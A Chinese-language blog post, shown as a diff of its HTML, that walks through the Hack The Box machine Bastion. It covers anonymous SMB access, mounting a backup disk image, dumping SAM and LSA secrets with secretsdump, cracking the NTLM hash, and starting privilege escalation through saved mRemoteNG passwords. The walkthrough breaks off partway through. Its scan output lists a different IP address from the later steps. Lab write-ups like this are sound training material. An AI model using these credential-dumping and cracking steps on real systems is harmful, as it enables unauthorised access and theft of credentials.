@@ -1,0 +1,651 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="vwv">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00:Reconnmap1234567891011121314151617181920212223242526272829303132333435sudo nmap -n -v -sS -p- 10.10.10.161 --max-retries&#x3D;3 -Pn -oN allports.txtPORT      STATE    SERVICE53&#x2F;tcp    open     domain8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="htb-Bastion">
+<meta property="og:url" content="http://example.com/2024/12/06/htb-Bastion/index.html">
+<meta property="og:site_name" content="vwv">
+<meta property="og:description" content="0x00:Reconnmap1234567891011121314151617181920212223242526272829303132333435sudo nmap -n -v -sS -p- 10.10.10.161 --max-retries&#x3D;3 -Pn -oN allports.txtPORT      STATE    SERVICE53&#x2F;tcp    open     domain8">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-06T07:43:42.000Z">
+<meta property="article:modified_time" content="2024-12-06T07:48:26.317Z">
+<meta property="article:author" content="vwv">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>htb-Bastion - vwv</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>vwv</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="htb-Bastion"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-06 15:43" pubdate>
+          2024年12月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">htb-Bastion</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0x00-Recon"><a href="#0x00-Recon" class="headerlink" title="0x00:Recon"></a>0x00:Recon</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -n -v -sS -p- 10.10.10.161 --max-retries=3 -Pn -oN allports.txt<br>PORT      STATE    SERVICE<br>53/tcp    open     domain<br>88/tcp    open     kerberos-sec<br>135/tcp   open     msrpc<br>139/tcp   open     netbios-ssn<br>389/tcp   open     ldap<br>445/tcp   open     microsoft-ds<br>464/tcp   open     kpasswd5<br>593/tcp   open     http-rpc-epmap<br>636/tcp   open     ldapssl<br>2157/tcp  filtered xnds<br>3268/tcp  open     globalcatLDAP<br>3269/tcp  open     globalcatLDAPssl<br>5985/tcp  open     wsman<br>9389/tcp  open     adws<br>10146/tcp filtered unknown<br>11498/tcp filtered unknown<br>12490/tcp filtered unknown<br>21589/tcp filtered unknown<br>21871/tcp filtered unknown<br>28217/tcp filtered unknown<br>34534/tcp filtered unknown<br>47001/tcp open     winrm<br>49664/tcp open     unknown<br>49665/tcp open     unknown<br>49666/tcp open     unknown<br>49667/tcp open     unknown<br>49671/tcp open     unknown<br>49678/tcp open     unknown<br>49679/tcp open     unknown<br>49686/tcp open     unknown<br>49708/tcp open     unknown<br>49977/tcp open     unknown<br>61795/tcp filtered unknown<br></code></pre></td></tr></table></figure>
+<p>存在敏感端口445</p>
+<h2 id="SMB-445"><a href="#SMB-445" class="headerlink" title="SMB: 445"></a>SMB: 445</h2><p>存在SMB非授权访问</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">smbclient -L //<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.134</span><br><span class="hljs-keyword">Password</span> <span class="hljs-keyword">for</span> [WORKGROUP\vwv]:<br><br>	Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>	<span class="hljs-comment">---------       ----      -------</span><br>	<span class="hljs-keyword">ADMIN</span>$          Disk      Remote <span class="hljs-keyword">Admin</span><br>	Backups         Disk<br>	C$              Disk      <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>	IPC$            IPC       Remote IPC<br>SMB1 disabled <span class="hljs-comment">-- no workgroup available</span><br></code></pre></td></tr></table></figure>
+<p>分别查看Share的目录，其中Backups的内容可读，下载其中的note.txt</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient -N <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.134</span>/Backups<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Tue Apr <span class="hljs-number">16</span> <span class="hljs-number">18</span>:<span class="hljs-number">02</span>:<span class="hljs-number">11</span> <span class="hljs-number">2019</span><br>  ..                                  D        <span class="hljs-number">0</span>  Tue Apr <span class="hljs-number">16</span> <span class="hljs-number">18</span>:<span class="hljs-number">02</span>:<span class="hljs-number">11</span> <span class="hljs-number">2019</span><br>  note.txt                           AR      <span class="hljs-number">116</span>  Tue Apr <span class="hljs-number">16</span> <span class="hljs-number">18</span>:<span class="hljs-number">10</span>:<span class="hljs-number">09</span> <span class="hljs-number">2019</span><br>  SDT65CB.tmp                         A        <span class="hljs-number">0</span>  Fri Feb <span class="hljs-number">22</span> <span class="hljs-number">20</span>:<span class="hljs-number">43</span>:<span class="hljs-number">08</span> <span class="hljs-number">2019</span><br>  WindowsImageBackup                 Dn        <span class="hljs-number">0</span>  Fri Feb <span class="hljs-number">22</span> <span class="hljs-number">20</span>:<span class="hljs-number">44</span>:<span class="hljs-number">02</span> <span class="hljs-number">2019</span><br><br>		<span class="hljs-number">5638911</span> blocks of size <span class="hljs-number">4096</span>. <span class="hljs-number">1170916</span> blocks available<br>smb: \&gt; get note.txt<br>getting file \note.txt of size <span class="hljs-number">116</span> as note.txt (<span class="hljs-number">0.3</span> KiloBytes<span class="hljs-regexp">/sec) (average 0.3 KiloBytes/</span>sec)<br>smb: \&gt; <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+<p>查看note.txt的内容，其中说明使用传输协议会非常缓慢</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">cat note.txt<br><br><span class="hljs-symbol">Sysadmins:</span> please don<span class="hljs-comment">&#x27;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.</span><br></code></pre></td></tr></table></figure>
+<p>使用挂载方式，将共享挂载于本地，从而可以正常浏览</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">vwv @ kali <span class="hljs-keyword">in</span> /Users/vwv [22:36:51]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">sudo</span> mount -t cifs //10.10.10.134/backups /mnt -o user=,password=</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">vwv @ kali <span class="hljs-keyword">in</span> /mnt [22:37:18]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>SDT65CB.tmp  WindowsImageBackup  note.txt<br></code></pre></td></tr></table></figure>
+<p>在其中&#x2F;WindowsImageBackup&#x2F;L4mpje-PC&#x2F;Backup路径下，存在vhd文件</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># vwv @ kali in /mnt/WindowsImageBackup/L4mpje-PC/Backup 2019<span class="hljs-string">-02</span><span class="hljs-string">-22</span> 124351 [10:10:30]<br>$ ls<br>9b9cfbc3<span class="hljs-string">-369</span>e<span class="hljs-string">-11</span>e9-a17c<span class="hljs-string">-806</span>e6f6e6963.vhd                                                      cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Writer542da469-d3e1<span class="hljs-string">-473</span>c<span class="hljs-string">-9</span>f4f<span class="hljs-string">-7847</span>f01fc64f.xml<br>9b9cfbc4<span class="hljs-string">-369</span>e<span class="hljs-string">-11</span>e9-a17c<span class="hljs-string">-806</span>e6f6e6963.vhd                                                      cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Writera6ad56c2-b509<span class="hljs-string">-4</span>e6c-bb19<span class="hljs-string">-49</span>d8f43532f0.xml<br>BackupSpecs.xml                                                                               cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Writerafbab4a2<span class="hljs-string">-367</span>d<span class="hljs-string">-4</span>d15-a586<span class="hljs-string">-71</span>dbb18f8485.xml<br>cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_AdditionalFilesc3b9f3c7<span class="hljs-string">-5</span>e52<span class="hljs-string">-4</span>d5e<span class="hljs-string">-8</span>b20<span class="hljs-string">-19</span>adc95a34c7.xml  cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Writerbe000cbe<span class="hljs-string">-11</span>fe<span class="hljs-string">-4426</span><span class="hljs-string">-9</span>c58<span class="hljs-string">-531</span>aa6355fc4.xml<br>cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Components.xml                                           cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Writercd3f2362<span class="hljs-string">-8</span>bef<span class="hljs-string">-46</span>c7<span class="hljs-string">-9181</span>-d62844cdc0b2.xml<br>cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_RegistryExcludes.xml                                     cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Writere8132975<span class="hljs-string">-6</span>f93<span class="hljs-string">-4464</span>-a53e<span class="hljs-string">-1050253</span>ae220.xml<br>cd113385<span class="hljs-string">-65</span>ff<span class="hljs-string">-4</span>ea2<span class="hljs-string">-8</span>ced<span class="hljs-string">-5630</span>f6feca8f_Writer4dc3bdd4-ab48<span class="hljs-string">-4</span>d07-adb0<span class="hljs-string">-3</span>bee2926fd7f.xml<br></code></pre></td></tr></table></figure>
+<p>需要将vhd(Virtual hard disk 虚拟硬盘)文件挂载在本地，我们才可以访问，这里使用工具guestmount</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">guestmount</span> --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ <span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">22</span>\ <span class="hljs-number">124351</span>/<span class="hljs-number">9</span>b9cfbc4-<span class="hljs-number">369</span>e-<span class="hljs-number">11</span>e9-a17c-<span class="hljs-number">806</span>e6f6e6963.vhd --inspector --ro /Users/vwv/OSCP/Bastion/mnt<br></code></pre></td></tr></table></figure>
+<p>成功将vhd内容挂载在本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"> vwv @ kali <span class="hljs-keyword">in</span> /Users/vwv/OSCP/Bastion/mnt [11:41:42]<br>$ <span class="hljs-built_in">ls</span><br><span class="hljs-string">&#x27;$Recycle.Bin&#x27;</span>  <span class="hljs-string">&#x27;Documents and Settings&#x27;</span>   PerfLogs  <span class="hljs-string">&#x27;Program Files&#x27;</span>   ProgramData   Recovery  <span class="hljs-string">&#x27;System Volume Information&#x27;</span>   Users   Windows   autoexec.bat   config.sys   pagefile.sys<br></code></pre></td></tr></table></figure>
+<h1 id="0x01-Shell-as-L4mpje"><a href="#0x01-Shell-as-L4mpje" class="headerlink" title="0x01:Shell as L4mpje"></a>0x01:Shell as L4mpje</h1><p>在普通情况下，vhd文件是有被限制读取的。但是由于我们是将vhd驱动挂载，因此我们拥有全部的访问权限，可以访问注册表文件。</p>
+<p>SAM 文件：SAM (Security Accounts Manager) 文件是 Windows 系统中用于存储用户账户信息和加密密码哈希的位置。这个文件通常位于：C:\Windows\System32\config\SAM<br>Security文件：存储了 本地安全策略和与用户身份验证、访问控制列表（ACLs）、权限管理等相关的信息。这个文件位于C:\Windows\System32\config\Security<br>NTLM 哈希格式如下，其中aad3b435b51404eeaad3b435b51404ee 是 LM 哈希，31d6cfe0d16ae931b73c59d7e0c089c0 是 NTLM 哈希。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Administrator:<span class="hljs-number">500</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::<br></code></pre></td></tr></table></figure>
+<p>NTLM 和 Kerberos都是 Windows 系统中用于身份验证的协议。Kerberos 是一个现代的、功能更强的协议，而 NTLM 主要是老旧系统中使用的协议。</p>
+<p>使用Secretdump可以将SAM和Security中的Hash读取出来</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">secretsdump</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-sam</span> <span class="hljs-selector-tag">SAM</span> <span class="hljs-selector-tag">-security</span> <span class="hljs-selector-tag">SECURITY</span> <span class="hljs-selector-tag">-system</span> <span class="hljs-selector-tag">SYSTEM</span> <span class="hljs-selector-tag">LOCAL</span><br><span class="hljs-selector-tag">Impacket</span> <span class="hljs-selector-tag">v0</span><span class="hljs-selector-class">.12</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.dev1</span>+<span class="hljs-number">20240718.115833</span><span class="hljs-selector-class">.4e0e3174</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Copyright</span> <span class="hljs-number">2023</span> <span class="hljs-selector-tag">Fortra</span><br><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Target</span> <span class="hljs-selector-tag">system</span> <span class="hljs-selector-tag">bootKey</span>: <span class="hljs-number">0</span><span class="hljs-selector-tag">x8b56b2cb5033d8e2e289c26f8939a25f</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Dumping</span> <span class="hljs-selector-tag">local</span> <span class="hljs-selector-tag">SAM</span> <span class="hljs-selector-tag">hashes</span> (<span class="hljs-attribute">uid</span>:<span class="hljs-attribute">rid</span>:<span class="hljs-attribute">lmhash</span>:nthash)<br><span class="hljs-selector-tag">Administrator</span>:<span class="hljs-number">500</span>:<span class="hljs-selector-tag">aad3b435b51404eeaad3b435b51404ee</span>:<span class="hljs-number">31</span><span class="hljs-selector-tag">d6cfe0d16ae931b73c59d7e0c089c0</span>:::<br><span class="hljs-selector-tag">Guest</span>:<span class="hljs-number">501</span>:<span class="hljs-selector-tag">aad3b435b51404eeaad3b435b51404ee</span>:<span class="hljs-number">31</span><span class="hljs-selector-tag">d6cfe0d16ae931b73c59d7e0c089c0</span>:::<br><span class="hljs-selector-tag">L4mpje</span>:<span class="hljs-number">1000</span>:<span class="hljs-selector-tag">aad3b435b51404eeaad3b435b51404ee</span>:<span class="hljs-number">26112010952</span><span class="hljs-selector-tag">d963c8dc4217daec986d9</span>:::<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Dumping</span> <span class="hljs-selector-tag">cached</span> <span class="hljs-selector-tag">domain</span> <span class="hljs-selector-tag">logon</span> <span class="hljs-selector-tag">information</span> (domain/<span class="hljs-attribute">username</span>:hash)<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Dumping</span> <span class="hljs-selector-tag">LSA</span> <span class="hljs-selector-tag">Secrets</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">DefaultPassword</span><br>(Unknown User):<span class="hljs-selector-tag">bureaulampje</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">DPAPI_SYSTEM</span><br><span class="hljs-selector-tag">dpapi_machinekey</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">x32764bdcb45f472159af59f1dc287fd1920016a6</span><br><span class="hljs-selector-tag">dpapi_userkey</span>:<span class="hljs-number">0</span><span class="hljs-selector-tag">xd2e02883757da99914e3138496705b223e9d03dd</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Cleaning</span> <span class="hljs-selector-tag">up</span>...<br></code></pre></td></tr></table></figure>
+<p> <a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a> 可以对NTLM Hash进行破解，破解结果如下L4mpje:bureaulampje<br>也可以使用hashcat进行破解，-m&#x3D;1000时指的是破解NTLM Hash</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">1000</span> <span class="hljs-number">2</span>.hash /Users/vwv/Tools/<span class="hljs-number">4</span>_Dict/SecLists/rockyou.txt<br></code></pre></td></tr></table></figure>
+<p>使用此用户凭据ssh连接</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ssh L<span class="hljs-number">4</span>mpje<span class="hljs-title">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">134</span><br>L<span class="hljs-number">4</span>mpje<span class="hljs-title">@10</span>.<span class="hljs-number">10.10</span>.<span class="hljs-number">134</span>&#x27;s password:<br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">14393</span>]<br>(<span class="hljs-keyword">c</span>) <span class="hljs-number">2016</span> Microsoft Corporation. All rights reserved.<br><br>l<span class="hljs-number">4</span>mpje<span class="hljs-title">@BASTION</span> C:\Users\L<span class="hljs-number">4</span>mpje&gt;<br></code></pre></td></tr></table></figure>
+<h1 id="0x02-Privilege-Escalation"><a href="#0x02-Privilege-Escalation" class="headerlink" title="0x02 Privilege Escalation"></a>0x02 Privilege Escalation</h1><p>其在C:\Program Files (x86)路径下存在mRemoteNG软件，该软件是类似于windows远程桌面连接的软件，并支持用户将各种类型连接的密码保存在本地。这些信息保存在用户的 AppData 目录下的 ConfCons.xml </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">l4mpje</span>@BASTION C:\Program Files (x86)&gt;dir<br> <span class="hljs-attribute">Volume</span> in drive C has no label.<br> <span class="hljs-attribute">Volume</span> Serial Number is <span class="hljs-number">1</span>B7D-E692<br><br> <span class="hljs-attribute">Directory</span> of C:\Program Files (x86)<br><br><span class="hljs-attribute">22</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">14</span>:<span class="hljs-number">01</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">22</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">14</span>:<span class="hljs-number">01</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">16</span>-<span class="hljs-number">07</span>-<span class="hljs-number">2016</span>  <span class="hljs-number">14</span>:<span class="hljs-number">23</span>    &lt;DIR&gt;          Common Files<br><span class="hljs-attribute">23</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">09</span>:<span class="hljs-number">38</span>    &lt;DIR&gt;          Internet Explorer<br><span class="hljs-attribute">16</span>-<span class="hljs-number">07</span>-<span class="hljs-number">2016</span>  <span class="hljs-number">14</span>:<span class="hljs-number">23</span>    &lt;DIR&gt;          Microsoft.NET<br><span class="hljs-attribute">22</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">14</span>:<span class="hljs-number">01</span>    &lt;DIR&gt;          mRemoteNG<br><span class="hljs-attribute">23</span>-<span class="hljs-number">02</span>-<span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">22</span>    &lt;DIR&gt;          Windows Defender<br><span 